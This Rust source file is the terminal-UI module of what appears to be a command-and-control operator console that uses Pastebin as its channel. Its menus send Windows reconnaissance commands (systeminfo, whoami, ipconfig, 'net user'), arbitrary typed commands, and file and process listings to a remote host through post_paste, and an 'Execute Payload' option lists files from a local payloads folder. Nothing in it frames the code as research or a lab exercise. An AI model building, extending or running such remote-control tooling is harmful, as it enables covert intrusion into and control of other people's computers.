// TUI module
use crate::api::pastebin::requests::post_paste;
use crate::AppState;
use crate::MenuContext;
use self::handler::InputType;
use crate::crux::state::ViewMode;
use std::sync::Arc;
use tokio::sync::Mutex;

mod handler;
mod ui;
pub mod logger;

pub fn run(app_state: Arc<Mutex<AppState>>) {
    let mut terminal = ratatui::init();

    loop {
        // Draw UI at the start of each tick
        {
            let state = futures::executor::block_on(app_state.lock());
            terminal.draw(|frame| ui::render(frame, &state)).unwrap();
        }

        // Handle non‑blocking input
        match handler::input() {
            InputType::None => {}
            InputType::Quit => break,
            InputType::Char(c) => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active && state.menu_state.context == MenuContext::QuickCommand {
                    state.menu_input_buffer.push(c);
                } else if state.input_mode {
                    state.input_buffer.push(c);
                } else if c == 'm' {
                    if !state.input_mode {
                        state.menu_state.active = !state.menu_state.active;
                    }
                }
            }
            InputType::Up => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active {
                    if state.menu_state.selected_index > 0 {
                        state.menu_state.selected_index -= 1;
                    }
                } else if state.input_mode {
                    if !state.command_history.is_empty() && state.history_index > 0 {
                        state.history_index -= 1;
                        state.input_buffer = state.command_history[state.history_index].clone();
                    }
                } else if !state.pastes.is_empty() {
                    let i = match state.list_state.selected() {
                        Some(i) => {
                            if i == 0 { state.pastes.len() - 1 } else { i - 1 }
                        }
                        None => 0,
                    };
                    state.list_state.select(Some(i));
                }
            }
            InputType::Down => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active {
                    if state.menu_state.selected_index < state.menu_state.items.len() - 1 {
                        state.menu_state.selected_index += 1;
                    }
                } else if state.input_mode {
                    if !state.command_history.is_empty() {
                        if state.history_index < state.command_history.len() - 1 {
                            state.history_index += 1;
                            state.input_buffer = state.command_history[state.history_index].clone();
                        } else {
                            state.history_index = state.command_history.len();
                            state.input_buffer.clear();
                        }
                    }
                } else if !state.pastes.is_empty() {
                    let i = match state.list_state.selected() {
                        Some(i) => {
                            if i >= state.pastes.len() - 1 { 0 } else { i + 1 }
                        }
                        None => 0,
                    };
                    state.list_state.select(Some(i));
                }
            }
            InputType::Enter => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active {
                    match state.menu_state.context {
                        MenuContext::Main => {
                            match state.menu_state.selected_index {
                                0 => {
                                    let command = "systeminfo".to_string();
                                    state.log(&format!("Command sent: {}", command), "INFO");
                                    tokio::spawn(async move { let _ = post_paste(&command).await; });
                                    state.menu_state.active = false;
                                }
                                1 => {
                                    state.menu_state.context = MenuContext::HostCommands;
                                    state.menu_state.items = vec![
                                        "whoami".to_string(),
                                        "ipconfig".to_string(),
                                        "net user".to_string(),
                                        "Back".to_string(),
                                    ];
                                    state.menu_state.selected_index = 0;
                                }
                                2 => {
                                    state.menu_state.context = MenuContext::QuickCommand;
                                    state.menu_input_buffer.clear();
                                }
                                3 => {
                                    state.view_mode = ViewMode::FileBrowser;
                                    state.menu_state.active = false;
                                    state.log("Fetching file list...", "INFO");
                                    tokio::spawn(async move { let _ = post_paste("ls").await; });
                                }
                                4 => {
                                    state.view_mode = ViewMode::ProcessList;
                                    state.menu_state.active = false;
                                    state.log("Fetching process list...", "INFO");
                                    tokio::spawn(async move { let _ = post_paste("ps").await; });
                                }
                                5 => {
                                    state.log("Execute Payload selected", "INFO");
                                    state.view_mode = ViewMode::PayloadList;
                                    state.menu_state.active = false;
                                    
                                    // Populate payload list
                                    let app_state_clone = app_state.clone();
                                    tokio::spawn(async move {
                                        let mut payloads = vec![];
                                        if let Ok(mut entries) = tokio::fs::read_dir("payloads").await {
                                            while let Ok(Some(entry)) = entries.next_entry().await {
                                                if let Ok(file_name) = entry.file_name().into_string() {
                                                    payloads.push(file_name);
                                                }
                                            }
                                        }
                                        let mut state = app_state_clone.lock().await;
                                        state.payload_list = payloads;
                                    });
                                }
                                6 => {
                                    state.view_mode = ViewMode::Logs;
                                    state.menu_state.active = false;
                                }
                                7 => {
                                    state.view_mode = ViewMode::Dashboard;
                                    state.menu_state.active = false;
                                }
                                _ => {}
                            }
                        }
                        MenuContext::HostCommands => {
                            let command = match state.menu_state.selected_index {
                                0 => Some("whoami"),
                                1 => Some("ipconfig"),
                                2 => Some("net user"),
                                _ => None,
                            };
                            if let Some(cmd) = command {
                                let cmd_string = cmd.to_string();
                                state.log(&format!("Command sent: {}", cmd_string), "INFO");
                                tokio::spawn(async move { let _ = post_paste(&cmd_string).await; });
                                state.menu_state.active = false;
                                state.menu_state.context = MenuContext::Main;
                                state.menu_state.items = vec![
                                    "System Info".to_string(),
                                    "Host Commands".to_string(),
                                    "Quick Command".to_string(),
                                    "File Browser".to_string(),
                                    "Process List".to_string(),
                                    "Execute Payload".to_string(),
                                    "Back".to_string(),
                                ];
                                state.menu_state.selected_index = 0;
                            } else {
                                state.menu_state.context = MenuContext::Main;
                                state.menu_state.items = vec![
                                    "System Info".to_string(),
                                    "Host Commands".to_string(),
                                    "Quick Command".to_string(),
                                    "File Browser".to_string(),
                                    "Process List".to_string(),
                                    "Execute Payload".to_string(),
                                    "Back".to_string(),
                                ];
                                state.menu_state.selected_index = 0;
                            }
                        }
                        MenuContext::QuickCommand => {
                            let command = state.menu_input_buffer.clone();
                            if !command.is_empty() {
                                state.log(&format!("Command sent: {}", command), "INFO");
                                tokio::spawn(async move { let _ = post_paste(&command).await; });
                            }
                            state.menu_input_buffer.clear();
                            state.menu_state.context = MenuContext::Main;
                            state.menu_state.items = vec![
                                "System Info".to_string(),
                                "Host Commands".to_string(),
                                "Quick Command".to_string(),
                                "File Browser".to_string(),
                                "Process List".to_string(),
                                "Execute Payload".to_string(),
                                "Back".to_string(),
                            ];
                            state.menu_state.selected_index = 0;
                        }
                    }
                } else if state.input_mode {
                    let command: String = state.input_buffer.drain(..).collect();
                    if !command.is_empty() {
                        state.command_history.push(command.clone());
                        state.history_index = state.command_history.len();
                        state.log(&format!("Command sent: {}", command), "INFO");
                        tokio::spawn(async move { let _ = post_paste(&command).await; });
                    }
                    state.input_mode = false;
                } else {
                    state.input_mode = true;
                    state.history_index = state.command_history.len();
                }
            }
            InputType::Esc => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active {
                    if state.menu_state.context == MenuContext::HostCommands || state.menu_state.context == MenuContext::QuickCommand {
                        state.menu_state.context = MenuContext::Main;
                        state.menu_state.items = vec![
                            "System Info".to_string(),
                            "Host Commands".to_string(),
                            "Quick Command".to_string(),
                            "File Browser".to_string(),
                            "Process List".to_string(),
                            "Execute Payload".to_string(),
                            "Back".to_string(),
                        ];
                        state.menu_state.selected_index = 0;
                    } else {
                        state.menu_state.active = false;
                    }
                } else if state.view_mode != ViewMode::Dashboard {
                    state.view_mode = ViewMode::Dashboard;
                } else {
                    state.input_mode = false;
                }
            }
            InputType::Backspace => {
                let mut state = futures::executor::block_on(app_state.lock());
                if state.menu_state.active && state.menu_state.context == MenuContext::QuickCommand {
                    state.menu_input_buffer.pop();
                } else if state.input_mode {
                    state.input_buffer.pop();
                }
            }
        }

        // Sleep to limit CPU usage and allow background updates
        std::thread::sleep(std::time::Duration::from_millis(30));
    }

    ratatui::restore();
}
